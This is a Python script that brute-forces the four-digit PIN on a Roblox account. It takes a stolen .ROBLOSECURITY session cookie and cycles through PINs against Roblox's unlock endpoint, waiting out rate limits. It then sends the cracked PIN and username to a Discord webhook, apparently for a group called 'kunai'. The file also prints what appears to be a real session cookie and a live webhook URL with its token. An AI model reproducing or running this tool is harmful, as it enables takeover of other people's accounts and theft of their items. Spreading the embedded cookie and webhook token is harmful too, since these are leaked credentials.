import requests
import re
import string
import time
import os

pingEveryone = True
print('')
print('_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_16607BD6D09AE0E7506B9114595997A03431AF834942C88B8BA6912783886CDA58A19167A91110F402867D12E080F6C84BBCE960035FDD826BEE38A69C23BC83BC58FF46D737A9F411ACAEE89902C6BE1E6203E3619DF0DB394B3CB36AE94D34B9887A82DB31A9F48EECE85B55A4627FEF5A912663E23BEBA4BC2A42A399DB16DED222BA0A50E73CB4F6E5841589139F4DC50322538CD6D1E03BFA6BEEDDAD4AFFC5427BD01C91F7DF6874D1D700DA1E4FCD6F5C4B6416347D930A60673296DE408A8F4F67AD3F06A2B7D0ACCFE486493CD72CC51BE8ABC47056D462D90B213B70F19D847E481F977946198CE4BE6DA0C199F9E3CC0E716DC2FB35A31A0EDEC3FD06F8E9A0D8916CB38C3AFE0D844FCB691F678360BCC5083BAA081E37D35ED3A77C41E16152E20DD8A5230AD0CCFB3DC3A18F33788EBD10E0A845DF91D5E362D5E8E6B4D86368EA706C265402F9571EB10BF875582837AB98CA29A7B25072ABCBD493D427BD6D46E8558D5AFE5581ECFF970A2E')
cookie = input()
os.system("cls")
print('')
print('https://discord.com/api/webhooks/998716232326983741/_IVh2jsTGpTbNWehDFrvebOunu4VEr9Pzv_O2fvPUzfjEN9F5BIpas_t1ZZyJKC3NeE2')
webhook = input()
os.system("cls")
print('')
print('Should we ping Everyone?: ( y / n )')
pingEveryone = input()
os.system("cls")
if pingEveryone.lower == 'y' or pingEveryone == 'yes':
    ping = '@everyone'
else:
    ping = '***Pin Cracked! Join Our Discord : https://discord.gg/kunai***'
os.system("cls")

print('''Cracker Has Started.''')

url = 'https://auth.roblox.com/v1/account/pin/unlock'
token = requests.post('https://auth.roblox.com/v1/login', cookies = {".ROBLOSECURITY":cookie})
xcrsf = (token.headers['x-csrf-token'])
header = {'X-CSRF-TOKEN': xcrsf}

i = 0

for i in range(9999):
    try:
        pin = str(i).zfill(4)
        payload = {'pin': pin}
        r = requests.post(url, data = payload, headers = header, cookies = {".ROBLOSECURITY":cookie})
        if 'unlockedUntil' in r.text:
            print(f'Pin Cracked! Pin: {pin}')
            username = requests.get("https://users.roblox.com/v1/users/authenticated",cookies={".ROBLOSECURITY":cookie}).json()['name']
            data = {
                "content" : ping,
                "username" : "kunai;",
                "avatar_url" : "https://cdn.discordapp.com/attachments/930056703930671164/930057430270881812/Tanqr_gfx.png"
            }
            data["embeds"] = [
                {
                    "description" : f"{username}\'s Pin:\n```{pin}```",
                    "title" : "Cracked Pin!",
                    "color" : 0x00ffff,
                }
            ]

            result = requests.post(webhook, json = data)
            input('Press any key to exit')
            break
            
        elif 'Too many requests made' in r.text:
                
            print('  Ratelimited, trying again in 60 seconds..')
            time.sleep(60)
                
        elif 'Authorization' in r.text:
                
            print('  Error! Is the cookie valid?')
            break
            
        elif 'Incorrect' in r.text:
            print(f"  Tried: {pin} , Incorrect!")
            time.sleep(10)  
    except:
        print('  Error!')
    
input('\n  Press any key to exit')
